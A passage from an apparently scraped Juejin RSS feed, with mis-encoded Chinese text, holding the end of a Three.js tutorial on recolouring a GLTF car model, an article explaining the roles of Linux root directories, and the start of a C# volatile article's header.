 <b> å›¾9-4 å›è°ƒå‚æ•°gltfä¿¡æ¯çš„ç½‘æ ¼å‚æ•°</b>
</p>
<h2 data-id="heading-2">9.3 ä¿®æ”¹è½¦æ¨¡å‹é¢œè‰²</h2>
<p>æ‰¾åˆ°äº†ç½‘æ ¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¿ç½‘æ ¼é‡Œé¢çš„æè´¨å»ä¿®æ”¹é¢œè‰²ã€‚ä½†ç½‘æ ¼æœ‰é‚£ä¹ˆå¤šï¼Œæ€ä¹ˆçŸ¥é“è¦ä¿®æ”¹å“ªä¸€ä¸ªç½‘æ ¼é‡Œçš„æè´¨é¢œè‰²ï¼Ÿ</p>
<p>æƒ³è¦ç²¾ç»†åŒ–çš„å»ä¿®æ”¹é¢œè‰²éœ€è¦å¯¹è½¦æ¨¡å‹æ˜¯æ€ä¹ˆæ‹¼èµ·æ¥çš„ï¼ŒçŸ¥é“æ¯ä¸€ä¸ªç½‘æ ¼å¯¹åº”çš„ä½ç½®æ‰è¡Œã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–ç½‘æ ¼çš„åç§°ï¼ˆchild.nameï¼‰å°±èƒ½çŸ¥é“å¯¹åº”çš„å“ªä¸€éƒ¨åˆ†ï¼Œä½†æˆ‘ä»¬è¿™ä¸ªæ¡ˆä¾‹çš„è½¦æ¨¡å‹ç½‘æ ¼ä¸å¤ªè§„èŒƒï¼Œç½‘æ ¼çš„åç§°æ˜¯Object_1~59ï¼Œæ‰€ä»¥å¹¶ä¸æ¸…æ¥šå“ªä¸€å—ç½‘æ ¼å¯¹åº”è½¦çš„å“ªä¸ªä½ç½®ã€‚è¿™æ¯”è¾ƒéº»çƒ¦ï¼Œæˆ‘ä»¬å¦‚æœåªæ˜¯å•çº¯æƒ³ç»™è½¦å˜ä¸ªè‰²ï¼Œå¯ä»¥ç›´æ¥éå†childså˜é‡ï¼Œæ‹¿åˆ°æ‰€æœ‰çš„ç½‘æ ¼ï¼Œç„¶åä»ç½‘æ ¼ä¸­æ‹¿åˆ°materialæè´¨ï¼Œç›´æ¥ä¿®æ”¹é¢œè‰²ä¸º0x00ff00ï¼ˆç»¿è‰²ï¼‰ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> loader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GLTFLoader</span>();
loader.<span class="hljs-title function_">load</span>(<span class="hljs-string">'./car/scene.gltf'</span>, <span class="hljs-function">(<span class="hljs-params">gltf</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gltf)
  <span class="hljs-keyword">const</span> childs = gltf.<span class="hljs-property">scene</span>.<span class="hljs-property">children</span>[<span class="hljs-number">0</span>].<span class="hljs-property">children</span>[<span class="hljs-number">0</span>].<span class="hljs-property">children</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(childs)
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> child <span class="hljs-keyword">of</span> childs) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-property">name</span>)
    <span class="hljs-keyword">if</span> (child <span class="hljs-keyword">instanceof</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-property">Mesh</span>) {
      child.<span class="hljs-property">material</span>.<span class="hljs-property">color</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0x00ff00</span>);
    }
  }
  scene.<span class="hljs-title function_">add</span>(gltf.<span class="hljs-property">scene</span>);
});
</code></pre>
<p>è½¦æ¨¡å‹-ç»¿è‰²å¦‚å›¾9-5æ‰€ç¤ºã€‚å¯ä»¥çœ‹åˆ°å‡ ä¹æ‰€æœ‰çš„é¢œè‰²é™¤äº†è½¦çª—ä¹‹å¤–å…¨å˜ç»¿è‰²çš„äº†ã€‚è¯´æ˜æ˜¯å¯ä»¥æ‹¿åˆ°è½¦æ¨¡å‹çš„ç½‘æ ¼ï¼Œè€Œæ‹¿åˆ°ç½‘æ ¼å°±å¯ä»¥å¯¹å‡ ä½•ä½“æˆ–è€…æè´¨å»é’ˆå¯¹æ€§çš„ä¿®æ”¹ï¼Œä»è€Œä½¿è½¦æ¨¡å‹å˜æˆæˆ‘ä»¬çœŸæ­£æƒ³è¦çš„æ•ˆæœã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ed59c1da46d4f9f86fb0483cb47276e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768463365&amp;x-signature=3l6PKoJ9EAaOu5H1lHjJveStS2w%3D" alt="image-20251219021105035" loading="lazy"/></p>
<p align="center">
 <b> å›¾9-5 è½¦æ¨¡å‹-ç»¿è‰²</b>
</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥è§£æLinuxæ ¹ç›®å½•æ ¸å¿ƒæ–‡ä»¶å¤¹çš„ä½œç”¨]]></title>    <link>https://juejin.cn/post/7592615536384344098</link>    <guid>https://juejin.cn/post/7592615536384344098</guid>    <pubDate>2026-01-08T07:59:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592615536384344098" data-draft-id="7592622563545907235" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥è§£æLinuxæ ¹ç›®å½•æ ¸å¿ƒæ–‡ä»¶å¤¹çš„ä½œç”¨"/> <meta itemprop="keywords" content="Linux"/> <meta itemprop="datePublished" content="2026-01-08T07:59:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ITæ©˜å­çš®"/> <meta itemprop="url" content="https://juejin.cn/user/3148645291002232"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥è§£æLinuxæ ¹ç›®å½•æ ¸å¿ƒæ–‡ä»¶å¤¹çš„ä½œç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3148645291002232/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ITæ©˜å­çš®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:59:53.000Z" title="Thu Jan 08 2026 07:59:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶ç³»ç»Ÿçš„å±‚æ¬¡ç»“æ„éµå¾ª <strong>Filesystem Hierarchy Standardï¼ˆFHSï¼‰</strong> â€‹ è§„èŒƒï¼Œæ ¹ç›®å½• <code>/</code>ä½œä¸ºæ‰€æœ‰ç›®å½•çš„â€œæ ¹èŠ‚ç‚¹â€ï¼Œå…¶ä¸‹æ¯ä¸ªå­ç›®å½•éƒ½æ‰¿æ‹…ç€ç‰¹å®šçš„ç³»ç»ŸåŠŸèƒ½æˆ–å­˜å‚¨è§’è‰²ã€‚ç†è§£æ ¹ç›®å½•å„æ–‡ä»¶å¤¹çš„ä½œç”¨ï¼Œæ˜¯é«˜æ•ˆç®¡ç†ç³»ç»Ÿã€é¡ºåˆ©éƒ¨ç½²é¡¹ç›®çš„å…³é”®ã€‚æœ¬æ–‡å°†å‰–ææ ¹ç›®å½•æ ¸å¿ƒæ–‡ä»¶å¤¹çš„åŠŸèƒ½ï¼Œå¹¶ç»“åˆçœŸå®é¡¹ç›®åœºæ™¯è®²è§£å®è·µæŠ€å·§ã€‚</p>
<h3 data-id="heading-0">1. <strong><code>/bin</code>ä¸ <code>/sbin</code>ï¼šåŸºç¡€å‘½ä»¤ä¸ç³»ç»Ÿç®¡ç†å·¥å…·</strong>â€‹</h3>
<ul>
<li>
<p><strong>ä½œç”¨</strong>ï¼š</p>
<ul>
<li><code>/bin</code>ï¼šå­˜æ”¾æ‰€æœ‰ç”¨æˆ·å¯æ‰§è¡Œçš„åŸºç¡€å‘½ä»¤ï¼ˆå¦‚ <code>ls</code>ã€<code>cp</code>ã€<code>mv</code>ï¼‰ï¼Œç³»ç»Ÿå¯åŠ¨å’Œå•ç”¨æˆ·æ¨¡å¼å¿…éœ€ã€‚</li>
<li><code>/sbin</code>ï¼šå­˜æ”¾ç³»ç»Ÿç®¡ç†å‘½ä»¤ï¼ˆå¦‚ <code>fdisk</code>ã€<code>systemctl</code>ï¼‰ï¼Œä»…é™ç®¡ç†å‘˜ä½¿ç”¨ã€‚</li>
</ul>
</li>
<li>
<p><strong>é¡¹ç›®åœºæ™¯</strong>ï¼š</p>
<ul>
<li><strong>è„šæœ¬ä¾èµ–</strong>ï¼šåœ¨Shellè„šæœ¬ä¸­ç›´æ¥è°ƒç”¨ <code>/bin/bash</code>æˆ– <code>/usr/bin/python3</code>ã€‚</li>
<li><strong>æƒé™ç®¡ç†</strong>ï¼šé€šè¿‡ <code>/sbin/iptables</code>é…ç½®é˜²ç«å¢™è§„åˆ™ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-1">2. <strong><code>/etc</code>ï¼šç³»ç»Ÿé…ç½®çš„é›†ä¸­ç®¡ç†ä¸­å¿ƒ</strong>â€‹</h3>
<ul>
<li>
<p><strong>ä½œç”¨</strong>ï¼šå­˜å‚¨å…¨å±€é…ç½®æ–‡ä»¶ï¼ˆå¦‚ç½‘ç»œã€ç”¨æˆ·ç­–ç•¥ï¼‰å’Œ<strong>æœåŠ¡é…ç½®</strong>ï¼ˆå¦‚Nginxã€SpringBootï¼‰ï¼Œæ˜¯ç³»ç»Ÿå®šåˆ¶åŒ–çš„æ ¸å¿ƒè½½ä½“ã€‚</p>
</li>
<li>
<p><strong>é¡¹ç›®åœºæ™¯</strong>ï¼š</p>
<ul>
<li><strong>Nginxé…ç½®</strong>ï¼šä¿®æ”¹ <code>/etc/nginx/nginx.conf</code>å®šä¹‰è™šæ‹Ÿä¸»æœºã€è´Ÿè½½å‡è¡¡è§„åˆ™ï¼›æ–°å¢è‡ªå®šä¹‰é…ç½®å¯æ”¾å…¥ <code>/etc/nginx/conf.d/</code>ï¼ˆNginxä¼šè‡ªåŠ¨åŠ è½½è¯¥ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶ï¼‰ã€‚</li>
<li><strong>MySQLå®‰å…¨åŠ å›º</strong>ï¼šç¼–è¾‘ <code>/etc/mysql/my.cnf</code>ï¼Œé…ç½®å­—ç¬¦é›†ã€è¿æ¥æ± å‚æ•°ï¼Œé‡å¯æœåŠ¡ç”Ÿæ•ˆã€‚</li>
<li><strong>SpringBooté…ç½®</strong>ï¼šåœ¨ <code>/etc/profile</code>ä¸­è®¾ç½®å…¨å±€ç¯å¢ƒå˜é‡ï¼ˆå¦‚æ•°æ®åº“è¿æ¥å‚æ•°ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-2">3. <strong><code>/home</code>ï¼šç”¨æˆ·æ•°æ®çš„ç‹¬ç«‹å­˜å‚¨åŒº</strong>â€‹</h3>
<ul>
<li>
<p><strong>ä½œç”¨</strong>ï¼šæ¯ä¸ªç”¨æˆ·çš„ç‹¬ç«‹ç›®å½•ï¼ˆå¦‚ <code>/home/dev</code>ï¼‰ï¼Œå­˜å‚¨ä¸ªäººæ–‡ä»¶ã€ä¸ªæ€§åŒ–é…ç½®ï¼ˆå¦‚ <code>.bashrc</code>ï¼‰ã€‚</p>
</li>
<li>
<p><strong>é¡¹ç›®åœºæ™¯</strong>ï¼š</p>
<ul>
<li><strong>ä»£ç ç®¡ç†</strong>ï¼šå¼€å‘è€…åœ¨ä¸ªäººç›®å½•ä¸‹å…‹éš†Gitä»“åº“ï¼ˆ<code>git clone</code>ï¼‰ã€‚</li>
<li><strong>ç¯å¢ƒéš”ç¦»</strong>ï¼šé€šè¿‡ <code>~/.m2/settings.xml</code>é…ç½®Mavenç§æœ‰ä»“åº“ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-3">4. <strong><code>/var</code>ï¼šåŠ¨æ€æ•°æ®çš„æŒä¹…åŒ–å­˜å‚¨</strong>â€‹</h3>
<ul>
<li>
<p><strong>ä½œç”¨</strong>ï¼šå­˜å‚¨æ—¥å¿—ï¼ˆ<code>/var/log</code>ï¼‰ã€æ•°æ®åº“ï¼ˆ<code>/var/lib/mysql</code>ï¼‰ã€ç¼“å­˜ï¼ˆ<code>/var/cache</code>ï¼‰ã€æœåŠ¡å¥—æ¥å­—ï¼ˆ<code>/var/run</code>ï¼‰ç­‰å¯å˜æ•°æ®ã€‚</p>
</li>
<li>
<p><strong>é¡¹ç›®åœºæ™¯</strong>ï¼š</p>
<ul>
<li><strong>æ—¥å¿—åˆ†æ</strong>ï¼šé€šè¿‡ <code>/var/log/nginx/access.log</code>åˆ†æè®¿é—®æµé‡ï¼›MySQLæ…¢æŸ¥è¯¢æ—¥å¿—éœ€åœ¨ <code>/etc/my.cnf</code>ä¸­å¯ç”¨ï¼ˆ<code>slow_query_log = 1</code>ï¼‰ï¼Œæ—¥å¿—ä¼šå†™å…¥ <code>/var/log/mysql/slow.log</code>ã€‚</li>
<li><strong>æ•°æ®åº“å¤‡ä»½</strong>ï¼šå®šæœŸå¤‡ä»½ <code>/var/lib/mysql</code>ä¸­çš„æ•°æ®åº“æ–‡ä»¶ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-4">5. <strong><code>/opt</code>ï¼šç¬¬ä¸‰æ–¹è½¯ä»¶çš„ç‹¬ç«‹å®‰è£…ç›®å½•</strong>â€‹</h3>
<ul>
<li>
<p><strong>ä½œç”¨</strong>ï¼šå­˜æ”¾å•†ä¸šè½¯ä»¶æˆ–å¤§å‹é—­æºå·¥å…·ï¼ˆå¦‚Dockerã€JDKï¼‰ï¼Œé¿å…ä¸ç³»ç»Ÿé»˜è®¤è½¯ä»¶å†²çªã€‚</p>
</li>
<li>
<p><strong>é¡¹ç›®åœºæ™¯</strong>ï¼š</p>
<ul>
<li><strong>ä¸­é—´ä»¶éƒ¨ç½²</strong>ï¼šå°†Rediså®‰è£…åˆ° <code>/opt/redis</code>ï¼Œç‹¬ç«‹ç®¡ç†é…ç½®å’Œæ•°æ®ã€‚</li>
<li><strong>å¤šç‰ˆæœ¬å…±å­˜</strong>ï¼šåœ¨ <code>/opt/java</code>ä¸‹å­˜æ”¾å¤šä¸ªJDKç‰ˆæœ¬ï¼Œé€šè¿‡ç¬¦å·é“¾æ¥åˆ‡æ¢ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-5">6. <strong><code>/tmp</code>ä¸ <code>/var/tmp</code>ï¼šä¸´æ—¶æ–‡ä»¶å­˜å‚¨åŒº</strong>â€‹</h3>
<ul>
<li>
<p><strong>ä½œç”¨</strong>ï¼š</p>
<ul>
<li><code>/tmp</code>ï¼šä¸´æ—¶æ–‡ä»¶ï¼ˆé‡å¯åæ¸…ç†ï¼‰ï¼Œé€‚åˆçŸ­æœŸç¼“å­˜ã€‚</li>
<li><code>/var/tmp</code>ï¼šè·¨é‡å¯ä¿ç•™çš„ä¸´æ—¶æ•°æ®ï¼ˆå¦‚ç¼–è¯‘ä¸­é—´æ–‡ä»¶ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>é¡¹ç›®åœºæ™¯</strong>ï¼š</p>
<ul>
<li><strong>æ–‡ä»¶ä¸Šä¼ </strong>ï¼šWebåº”ç”¨å°†ç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡æš‚å­˜ <code>/tmp</code>ï¼Œå¤„ç†å®Œæˆåç§»åŠ¨è‡³æŒä¹…åŒ–ç›®å½•ã€‚</li>
<li><strong>ç¼–è¯‘æ„å»º</strong>ï¼šä½¿ç”¨ <code>make -j4 TMPDIR=/var/tmp</code>æŒ‡å®šå¤§æ–‡ä»¶ä¸´æ—¶å­˜å‚¨è·¯å¾„ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-6">7. <strong><code>/usr</code>ï¼šç³»ç»Ÿèµ„æºçš„å…±äº«å­˜å‚¨åŒº</strong>â€‹</h3>
<ul>
<li>
<p><strong>ä½œç”¨</strong>ï¼šå­˜æ”¾å…±äº«åº“ï¼ˆ<code>/usr/lib</code>ï¼‰ã€ç½‘é¡µï¼ˆ<code>/usr/share</code>ï¼‰å’Œç”¨æˆ·çº§ç¨‹åºï¼ˆ<code>/usr/bin</code>ï¼‰ã€‚</p>
</li>
<li>
<p><strong>é¡¹ç›®åœºæ™¯</strong>ï¼š</p>
<ul>
<li><strong>å¼€å‘ä¾èµ–</strong>ï¼šPythonåŒ…é»˜è®¤å®‰è£…åˆ° <code>/usr/local/lib/python3.10/site-packages</code>ã€‚</li>
<li><strong>å­—ä½“ç®¡ç†</strong>ï¼šåœ¨ <code>/usr/share/fonts</code>ä¸‹æ·»åŠ è‡ªå®šä¹‰å­—ä½“ï¼Œå…¨å±€ç”Ÿæ•ˆã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-7">8. <strong><code>/boot</code>ï¼šç³»ç»Ÿå¯åŠ¨çš„æ ¸å¿ƒæ–‡ä»¶å­˜å‚¨</strong>â€‹</h3>
<ul>
<li>
<p><strong>ä½œç”¨</strong>ï¼šå­˜å‚¨å†…æ ¸é•œåƒï¼ˆ<code>vmlinuz</code>ï¼‰ã€å¼•å¯¼åŠ è½½å™¨ï¼ˆå¦‚GRUBï¼‰çš„é…ç½®æ–‡ä»¶ã€‚</p>
</li>
<li>
<p><strong>é¡¹ç›®åœºæ™¯</strong>ï¼š</p>
<ul>
<li><strong>å†…æ ¸å‡çº§</strong>ï¼šæ›¿æ¢ <code>/boot</code>ä¸‹çš„æ–°å†…æ ¸æ–‡ä»¶å¹¶æ›´æ–°GRUBé…ç½®ã€‚</li>
<li><strong>æ•‘æ´æ¨¡å¼</strong>ï¼šé€šè¿‡Live CDæŒ‚è½½æ ¹åˆ†åŒºåï¼Œä» <code>/boot</code>æ¢å¤æŸåçš„å†…æ ¸ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-8">9. <strong><code>/dev</code>ä¸ <code>/proc</code>ï¼šè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿçš„ä¿¡æ¯æ¥å£</strong>â€‹</h3>
<ul>
<li>
<p><strong>ä½œç”¨</strong>ï¼š</p>
<ul>
<li><code>/dev</code>ï¼šè®¾å¤‡æ–‡ä»¶ï¼ˆå¦‚ <code>/dev/sda</code>è¡¨ç¤ºç¡¬ç›˜ï¼‰ã€‚</li>
<li><code>/proc</code>ï¼šå®æ—¶ç³»ç»Ÿä¿¡æ¯ï¼ˆå¦‚ <code>/proc/cpuinfo</code>ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>é¡¹ç›®åœºæ™¯</strong>ï¼š</p>
<ul>
<li><strong>ç¡¬ä»¶è°ƒè¯•</strong>ï¼šé€šè¿‡ <code>/sys/class/net</code>æŸ¥çœ‹ç½‘ç»œæ¥å£çŠ¶æ€ã€‚</li>
<li><strong>æ€§èƒ½åˆ†æ</strong>ï¼šä½¿ç”¨ <code>cat /proc/meminfo</code>ç›‘æ§å†…å­˜ä½¿ç”¨æƒ…å†µã€‚</li>
</ul>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ç†è§£ Volatileï¼šC#.NET å†…å­˜å¯è§æ€§ä¸æœ‰åºæ€§]]></title>    <link>https://juejin.cn/post/7592120202319183922</link>    <guid>https://juejin.cn/post/7592120202319183922</guid>    <pubDate>2026-01-06T23:18:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592120202319183922" data-draft-id="7592130164965244966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ç†è§£ Volatileï¼šC#.NET å†…å­˜å¯è§æ€§ä¸æœ‰åºæ€§"/> <meta itemprop="keywords" content="C#,.NET"/> <meta itemprop="datePublished" content="2026-01-06T23:18:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å”é’æ«"/> <meta itemprop="url" content="https://juejin.cn/user/3737995266234280"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ç†è§£ Volatileï¼šC#.NET å†…å­˜å¯è§æ€§ä¸æœ‰åºæ€§
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3737995266234280/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å”é’æ«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T23:18:26.000Z" title="Tue Jan 06 2026 23:18:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
